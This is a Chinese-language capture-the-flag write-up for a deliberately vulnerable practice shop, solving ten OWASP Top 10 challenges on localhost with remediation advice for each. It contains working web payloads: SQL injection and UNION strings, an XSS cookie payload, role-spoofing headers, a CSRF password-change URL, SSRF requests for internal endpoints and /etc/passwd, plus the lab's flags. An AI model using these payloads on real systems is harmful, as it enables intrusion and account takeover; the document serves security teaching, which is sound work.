# PixelMart - OWASP Top 10 2021 靶场 WriteUp

> 复古像素风线上商城安全测试靶场 — 10 个挑战完整攻略

---

## 目录

- [A01 — 越权访问 (Broken Access Control)](#a01--越权访问-broken-access-control)
- [A02 — 加密失效 (Cryptographic Failures)](#a02--加密失效-cryptographic-failures)
- [A03 — SQL 注入 (Injection)](#a03--sql-注入-injection)
- [A04 — 不安全设计 (Insecure Design)](#a04--不安全设计-insecure-design)
- [A05 — 安全配置错误 (Security Misconfiguration)](#a05--安全配置错误-security-misconfiguration)
- [A06 — 使用含漏洞的组件 (Vulnerable Components)](#a06--使用含漏洞的组件-vulnerable-components)
- [A07 — 认证失效 (Identification & Authentication Failures)](#a07--认证失效-identification--authentication-failures)
- [A08 — 完整性失效 (Integrity Failures)](#a08--完整性失效-integrity-failures)
- [A09 — 日志与监控不足 (Security Logging & Monitoring Failures)](#a09--日志与监控不足-security-logging--monitoring-failures)
- [A10 — SSRF (Server-Side Request Forgery)](#a10--ssrf-server-side-request-forgery)

---

## A01 — 越权访问 (Broken Access Control)

### 漏洞场景

商城的管理面板在 `/admin` 路径。普通用户访问时被拒绝，但后端对身份的校验存在缺陷。

### 攻击路径

后端同时检查两个来源来判断用户角色：

1. **Cookie 中的 `role` 字段**
2. **请求头 `X-Forwarded-Role`**

只要任意一个为 `admin`，就能通过校验。

### 利用方法

**方法一：修改 Cookie**

在浏览器开发者工具 → Application → Cookies 中，将 `role` 的值从 `user` 改为 `admin`，然后刷新 `/admin` 页面。

**方法二：添加请求头**

使用 curl 或 Burp Suite 拦截请求，添加请求头：

```
X-Forwarded-Role: admin
```

```bash
curl -H "X-Forwarded-Role: admin" http://localhost:5000/api/admin
```

### Flag

```
FloatCTF{broken_access_control_bypassed}
```

### 修复建议

- 不要仅依赖前端传入的角色信息（Cookie/请求头）做权限校验
- 使用服务端 Session 或 JWT 存储用户身份，并在后端校验
- 实施最小权限原则

---

## A02 — 加密失效 (Cryptographic Failures)

### 漏洞场景

登录后，服务器返回的 Cookie 中有一个 `token` 字段，看起来像是一串随机字符。

### 攻击路径

Token 使用了 **Base64 编码** 而非真正的加密算法。Base64 是一种编码方式，不是加密，任何人都可以解码。

### 利用方法

1. 登录任意账号（如 `guest:guest123`）
2. 从 Cookie 中提取 `token` 值
3. 使用 Base64 解码：

```bash
# 从浏览器复制 token 值
echo "eyJ1c2VyX2lkIjogMywgInVzZXJuYW1lIjogImd1ZXN0IiwgInJvbGUiOiAidXNlciIsICJmbGFnIjogIkZsb2F0Q1RGe2Jhc2U2NF9pc19ub3RfZW5jcnlwdGlvbn0ifQ==" | base64 -d
```

解码后得到：

```json
{
  "user_id": 3,
  "username": "guest",
  "role": "user",
  "flag": "FloatCTF{base64_is_not_encryption}"
}
```

Flag 就在你自己的 token 里！

### Flag

```
FloatCTF{base64_is_not_encryption}
```

### 修复建议

- 使用真正的加密算法（如 AES）或 JWT 签名来保护 Token
- 不要在 Token 中存储敏感信息
- 密码应使用 bcrypt/argon2 等哈希算法存储

---

## A03 — SQL 注入 (Injection)

### 漏洞场景

商城首页有一个搜索框，用于搜索商品。后端直接将用户输入拼接到 SQL 查询中。

### 攻击路径

后端代码直接拼接用户输入：

```python
query = f"SELECT * FROM products WHERE name LIKE '%{search}%' OR description LIKE '%{search}%'"
```

### 利用方法

**路径一：布尔注入 / 显示所有商品**

在搜索框输入：

```
' OR 1=1--
```

这会使得 SQL 变成：

```sql
SELECT * FROM products WHERE name LIKE '%' OR 1=1--%'
```

`OR 1=1` 永远为真，`--` 注释掉后面的内容，于是返回所有商品。其中有一个隐藏商品 `???`，描述中就是 flag。

**路径二：UNION 注入读取隐藏表**

题目提示 flag 藏在 `this_is_flag` 表里，使用 UNION SELECT 读取：

```
' UNION SELECT 1,2,flag,4,5 FROM this_is_flag--
```

`products` 表有 5 列（id, name, description, price, is_hidden），所以 UNION SELECT 也需要 5 列。将 `flag` 映射到 `name` 或 `description` 列即可显示。

### Flag

```
FloatCTF{sql_injection_found_the_hidden_table}
FloatCTF{sql_union_attack_master}
```

### 修复建议

- 使用参数化查询（Prepared Statements）
- 使用 ORM 的内置查询方法，避免拼接 SQL
- 对用户输入进行严格的过滤和转义

---

## A04 — 不安全设计 (Insecure Design)

### 漏洞场景

购物车结算时，前端将商品价格发送给后端，后端直接使用前端传来的价格进行计算，未做任何校验。

### 攻击路径

请求体格式：

```json
{
  "items": [
    {"id": 1, "price": 299, "quantity": 1}
  ]
}
```

后端逻辑：`新余额 = 旧余额 - (price × quantity)`

如果 `price` 为负数，余额反而会增加！

### 利用方法

**第一步：利用负价格增加余额**

修改请求，将价格改为负数：

```json
{
  "items": [
    {"id": 1, "price": -99999, "quantity": 1}
  ]
}
```

余额从 100 变为 100099。

**第二步：购买 FLAG 商品**

商城里有一个名为 `🏁 FLAG` 的商品，售价 99999。现在余额足够，将其加入购物车并结算：

```json
{
  "items": [
    {"id": 7, "price": 99999, "quantity": 1}
  ]
}
```

结算成功后，订单确认页显示 flag。

### Flag

```
FloatCTF{negative_price_exploit}
```

### 修复建议

- 服务端应从数据库获取商品价格，而非信任前端传入的价格
- 所有涉及金额的计算必须在服务端完成
- 实施输入校验，拒绝负数或异常值

---

## A05 — 安全配置错误 (Security Misconfiguration)

### 漏洞场景

访问 `/robots.txt` 发现暴露了敏感路径：

```
User-agent: *
Disallow: /debug
Disallow: /console
Disallow: /backup
Disallow: /internal
```

### 攻击路径

`/backup` 路径未做任何访问控制，直接暴露了数据库备份文件。

### 利用方法

**第一步：下载备份文件**

访问 `http://localhost:5000/backup`，下载到 `backup.sql`。

文件中包含管理员密码的 MD5 哈希：

```sql
INSERT INTO users VALUES (1, 'admin', '0192023a7bbd73250516f069df18b500', 'admin', 99999.0);
```

文件末尾贴心地给出了提示：

```
-- Note: admin password hash is MD5('admin123')
-- Hash: 0192023a7bbd73250516f069df18b500
```

**第二步：破解 MD5 哈希**

MD5 哈希值 `0192023a7bbd73250516f069df18b500` 对应明文 `admin123`。

可以用在线 MD5 解密网站或 `hashcat` 破解。

**第三步：登录管理员账号**

使用 `admin:admin123` 登录，访问管理面板获取 flag。

### Flag

```
FloatCTF{md5_cracked_admin_access}
```

### 修复建议

- 生产环境关闭调试信息和敏感文件访问
- 使用强哈希算法（bcrypt/argon2）存储密码
- `/robots.txt` 不应暴露敏感路径（敏感路径应直接做访问控制）
- 备份文件不应放在 Web 可访问目录下

---

## A06 — 使用含漏洞的组件 (Vulnerable Components)

### 漏洞场景

前端页面使用了 **jQuery 1.8.3**（2009 年发布），该版本存在已知的 XSS 漏洞（CVE-2011-4969）。页面上有一个"联系我们"反馈表单。

### 攻击路径

旧版 jQuery 的 `html()` 方法在处理某些 HTML 内容时存在 XSS 漏洞。管理员会查看用户提交的反馈，如果反馈内容包含恶意脚本，会在管理员的浏览器中执行。

### 利用方法

**第一步：查看前端使用的 jQuery 版本**

打开浏览器开发者工具，在 Console 输入：

```javascript
$.fn.jquery
```

输出：`"1.8.3"`

或者在页面源码中查看：

```html
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
```

**第二步：提交 XSS payload**

在"联系我们"表单中输入：

```html
<script>alert(document.cookie)</script>
```

**第三步：模拟管理员查看反馈**

访问 `http://localhost:5000/api/admin/feedback`（模拟管理员查看反馈的接口），响应中设置了 Cookie：

```
Set-Cookie: flag=FloatCTF{jquery_xss_feedback_flag}
```

在实际场景中，这个脚本会在管理员浏览器中执行，将 Cookie 发送到攻击者服务器。

### Flag

```
FloatCTF{jquery_xss_feedback_flag}
```

### 修复建议

- 及时更新前端依赖库到最新安全版本
- 建立依赖版本监控机制（如 npm audit）
- 对用户输入进行 HTML 转义
- 实施 Content Security Policy (CSP)

---

## A07 — 认证失效 (Identification & Authentication Failures)

### 漏洞场景

登录页面无验证码、无速率限制，且存在弱口令账户。同时注册接口存在用户名未 trim 的逻辑漏洞。

### 攻击路径

**路径一：弱密码爆破**

系统存在一个特殊账户 `flagadmin`，密码非常简单。

**路径二：用户名 trim 逻辑漏洞**

注册接口使用 `username.strip()` 处理用户名，但登录时未 strip。可以注册 `admin `（带空格）来冒充管理员。

### 利用方法

**方法一：直接使用弱密码登录**

使用已知用户名 `flagadmin`，尝试常见弱密码：

```
flagadmin:flagadmin
```

登录成功即获得 flag。

**方法二：注册带空格的用户名**

1. 注册用户 `admin `（注意末尾有空格）
2. 登录 `admin `（带空格）
3. 查看订单列表，admin 的历史订单备注中包含 flag

### Flag

```
FloatCTF{auth_bypass_with_space_username}
```

### 修复建议

- 实施账户锁定策略（多次失败后临时锁定）
- 添加验证码机制
- 统一用户名的 trim 逻辑（注册和登录使用相同的处理方式）
- 禁止注册与现有用户名仅差空格的账号

---

## A08 — 完整性失效 (Integrity Failures)

### 漏洞场景

"修改密码"的接口使用 **GET 请求**而非 POST 请求，且无 CSRF Token 防护。

### 攻击路径

GET 请求可以通过 URL 直接构造，也可以嵌入到第三方页面的 `<img>` 或 `<script>` 标签中自动触发。如果管理员访问了恶意页面，密码会在不知情的情况下被修改。

### 利用方法

**第一步：构造 CSRF 攻击 URL**

直接修改 admin 的密码：

```
GET /api/profile/change-password?username=admin&new_password=hacked123
```

可以用 curl 直接执行：

```bash
curl "http://localhost:5000/api/profile/change-password?username=admin&new_password=hacked123"
```

**第二步：用新密码登录管理员**

使用 `admin:hacked123` 登录。

**第三步：访问管理面板**

登录后访问 `/admin`，此时后端检测到 Token 中的 role 为 admin，返回 flag。

### Flag

```
FloatCTF{csrf_get_request_password_change}
```

### 修复建议

- 修改密码等敏感操作应使用 POST/PUT 请求
- 实施 CSRF Token 机制
- 验证 Referer 头
- 修改密码时需要验证旧密码

---

## A09 — 日志与监控不足 (Security Logging & Monitoring Failures)

### 漏洞场景

`/api/logs` 接口未做任何鉴权，任何人都可以访问系统日志。日志中记录了敏感信息。

### 攻击路径

日志文件中包含了管理员登录后的 session 信息和 flag。

### 利用方法

**第一步：访问日志接口**

直接访问 `http://localhost:5000/api/logs` 或通过页面上的"系统日志"按钮。

**第二步：提取敏感信息**

日志内容：

```
[2024-01-15 08:00:05] 管理员 admin 登录成功 (session: admin_session_token_12345)
[2024-01-15 08:02:15] 管理员 admin 查看了 flag: FloatCTF{log_exposure_admin_session}
```

- 直接从日志中获取 flag
- 或者使用日志中泄露的 session token 冒充管理员

### Flag

```
FloatCTF{log_exposure_admin_session}
```

### 修复建议

- 日志接口必须做身份验证和授权
- 不要在日志中记录敏感信息（密码、session、flag 等）
- 实施日志级别管理，区分调试日志和生产日志
- 建立日志监控和告警机制

---

## A10 — SSRF (Server-Side Request Forgery)

### 漏洞场景

商品详情页有一个"预览图片"功能，用户可以输入图片 URL，后端会请求该 URL 并返回图片内容。后端未对 URL 做任何限制。

### 攻击路径

后端直接使用 `requests.get(url)` 获取 URL 内容，未限制协议（http/https/file）和目标地址（内网/外网）。

### 利用方法

**第一步：尝试访问内部接口**

后端有一个 `/internal/flag` 端点，只能从 localhost 访问。利用 SSRF 访问：

```json
{
  "url": "http://127.0.0.1:5000/internal/flag"
}
```

**第二步：获取 flag**

后端请求 `http://127.0.0.1:5000/internal/flag`，返回：

```json
{
  "flag": "FloatCTF{ssrf_caught_the_internal_flag}"
}
```

**扩展攻击：**

也可以尝试读取本地文件：

```json
{
  "url": "file:///etc/passwd"
}
```

或者扫描内网其他服务：

```json
{
  "url": "http://127.0.0.1:5000/admin"
}
```

### Flag

```
FloatCTF{ssrf_caught_the_internal_flag}
```

### 修复建议

- 限制允许请求的协议（仅允许 http/https）
- 禁止请求内网地址（127.0.0.1, 10.x.x.x, 172.16.x.x, 192.168.x.x）
- 实施 URL 白名单机制
- 对请求目标做 DNS 解析校验，防止 DNS rebinding 攻击

---

## 总结

| ID | 漏洞类别 | Flag | 难度 |
|----|---------|------|------|
| A01 | 越权访问 | `FloatCTF{broken_access_control_bypassed}` | ⭐ |
| A02 | 加密失效 | `FloatCTF{base64_is_not_encryption}` | ⭐ |
| A03 | SQL 注入 | `FloatCTF{sql_injection_found_the_hidden_table}` / `FloatCTF{sql_union_attack_master}` | ⭐⭐ |
| A04 | 不安全设计 | `FloatCTF{negative_price_exploit}` | ⭐⭐ |
| A05 | 安全配置错误 | `FloatCTF{md5_cracked_admin_access}` | ⭐⭐ |
| A06 | 脆弱组件 | `FloatCTF{jquery_xss_feedback_flag}` | ⭐⭐⭐ |
| A07 | 认证失效 | `FloatCTF{auth_bypass_with_space_username}` | ⭐ |
| A08 | 完整性失效 | `FloatCTF{csrf_get_request_password_change}` | ⭐⭐⭐ |
| A09 | 日志泄露 | `FloatCTF{log_exposure_admin_session}` | ⭐⭐ |
| A10 | SSRF | `FloatCTF{ssrf_caught_the_internal_flag}` | ⭐⭐⭐ |

---

> **免责声明**: 本文档仅供网络安全学习和教学参考。请勿将相关技术用于非法用途。
